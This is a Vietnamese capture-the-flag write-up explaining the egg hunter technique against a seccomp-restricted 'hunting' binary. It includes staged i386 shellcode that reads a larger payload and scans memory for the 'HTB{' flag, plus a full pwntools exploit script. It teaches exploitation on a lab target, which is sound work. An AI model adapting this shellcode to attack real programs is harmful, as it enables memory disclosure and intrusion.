# Egg hunter
[*video anh Trí - Egg hunter*](https://youtu.be/hun5c_WdquY)

*Egg hunter* là kĩ thuật sử dụng để tìm shellcode hay dữ liệu thông qua kiểm tra signature, các dấu hiệu đặc trưng của đối tượng đó. *Egg hunter* được dùng khi chương trình chỉ cho phép chạy 1 đoạn shellcode rất nhỏ. Vì không đủ kích thước tạo shell hay mở flag, người ta dùng nó để tìm shellcode lớn hơn hay flag được lưu trữ trong chương trình.

# Challenge

<img width="673" height="389" alt="image" src="https://github.com/user-attachments/assets/09500ec2-b86c-4a04-a134-a1b5ebc3ae58" />

Chương trình cho phép nhập shellcode và thực thi. 

Đồng thời cũng có *seccomp* chặn một số hàm quan trọng:

<img width="845" height="425" alt="image" src="https://github.com/user-attachments/assets/3a44f0a5-c519-4d32-9369-6e10e3237cdf" />

- Không thể gọi tạo shell do các hàm tạo tiến trình đều bị chặn.
- Không thể đọc flag vì các hàm mở file cũng bị chặn.

Tuy nhiên trong chương trình chứa sẵn flag. 

<img width="731" height="260" alt="image" src="https://github.com/user-attachments/assets/576a3e53-8ba3-4708-a21c-8b90bb07ba56" />
<img width="520" height="281" alt="image" src="https://github.com/user-attachments/assets/c642bc0a-d4fa-49b2-a2cb-151643fd9c3e" />

Chuỗi flag *"HTB{...}"* này được lưu vào  biến `dest` được tạo ra bởi hàm `random_addr`.

<img width="622" height="320" alt="image" src="https://github.com/user-attachments/assets/23051bab-484a-42de-b939-73e777c98002" />

Hàm này tạo ra một số ngẫu nhiên rồi dịch 16 BITS để tạo ra 1 địa chỉ lớn hơn 0x5FFFFFFFF đồng thời có đuôi 0000.

Khi địa chỉ này được đưa vào `mmap` thì sẽ căn chỉnh sao để địa chỉ đó chia hết cho 0x1000 (do cơ chế cấp phát bộ nhớ theo trang của hệ điều hành). Nhưng địa chỉ này vì đã có đuôi 0000 nên không cần chỉnh.

# Khai thác

Ý tưởng là sử dụng các dấu hiệu đặc trưng của flag như có chuỗi *"HTB{"* và có địa chỉ từ 0x60000000 trở đi để tìm vị trí của flag trong chương trình.

Vì 0x3c (60 BTYES) không đủ viết shellcode *egg hunter* nên cần gọi hàm `read` để nhập payload lớn hơn:

    shellcode1=asm('''
    	mov eax, 3
    	xor ebx, ebx
    	mov edx, 0x400
    	int 0x80
    	''', arch='i386')
    p.send(shellcode1.ljust(0x3c,b'B'))

### Egg hunter
Bây giờ tạo 1 vòng lặp đi từ địa chỉ 0x60000000 về sau để tìm xem địa chỉ nào hợp lệ để đọc (giá trị trả về eax khác 0xfffffff2). Với địa chỉ nào hợp lệ thì truy cập xem nếu đủ các kí tự *"HTB{"* thì in ra màn hình. 

đặt điểm bắt đầu tìm:

    shellcode2=asm('''
    	init:
    		mov edi,0x60000000  

 Kiểm tra địa chỉ hợp lệ bằng write:
 
    	run:                   
    		mov eax, 4
    		mov ebx, 1
    		mov ecx, edi
    		mov edx, 1
    		int 0x80
    		cmp al,0xf2
    		je next_page        //nếu không thấy thì tìm page sau
    		jmp check
Do cơ chế cấp phát bộ nhớ theo trang (mỗi trang là 0x1000 hay 4KB) nên chỉ cần tìm các địa chỉ chia hết cho 0x1000

    	next_page:
    		add edi,0x1000
    		jmp run

Kiểm tra xem địa chỉ có chứa đúng chuỗi flag:

    	check:
    		mov al, [edi+0]      //kiểm tra chuỗi flag
    		cmp al, 'H'
    		jne next_page
    		mov al, [edi+1]
    		cmp al, 'T'
    		jne next_page
    		mov al, [edi+2]
    		cmp al, 'B'
    		jne next_page
    		mov al, [edi+3]
    		cmp al, '{'
    		jne next_page

    		mov eax, 4            //in ra nếu thấy
    		mov ebx, 1
    		mov ecx, edi
    		mov edx, 0x100
    		int 0x80
    		''', arch='i386')
    
    p.send(b'A'*0x3c+shellcode2)

Vì lệnh `rand() << 16` luôn tạo ra địa chỉ có đuôi 0000 nên thay vì tìm theo từng trang 0x1000 thì cũng có thể cộng 0x10000 mỗi khi không tìm thấy để tối ưu tốc độ.
# Script python

    #!/usr/bin/env python3
    from pwn import *
    context.binary=exe=ELF('./hunting',checksec=False)
    p=process(exe.path)
    
    gdb.attach(p,gdbscript='''
    	b*0x5655654a
    	c
    	'''
    )
    
    shellcode1=asm('''
    	mov eax, 3
    	xor ebx, ebx
    	mov edx, 0x400
    	int 0x80
    	''', arch='i386')
    
    #0x60000000
    shellcode2=asm('''
    	init:
    		mov edi,0x60000000
    
    	run:
    		mov eax, 4
    		mov ebx, 1
    		mov ecx, edi
    		mov edx, 1
    		int 0x80
    		cmp al,0xf2
    		je next_page
    		jmp check
    
    	next_page:
    		add edi,0x10000
    		jmp run
    
    	check:
    		mov al, [edi+0]
    		cmp al, 'H'
    		jne next_page
    		mov al, [edi+1]
    		cmp al, 'T'
    		jne next_page
    		mov al, [edi+2]
    		cmp al, 'B'
    		jne next_page
    		mov al, [edi+3]
    		cmp al, '{'
    		jne next_page
    
    		mov eax, 4
    		mov ebx, 1
    		mov ecx, edi
    		mov edx, 0x100
    		int 0x80
    		''', arch='i386')
    
    p.send(shellcode1.ljust(0x3c,b'B')+b'A'*0x3c+shellcode2)
    
    p.interactive()
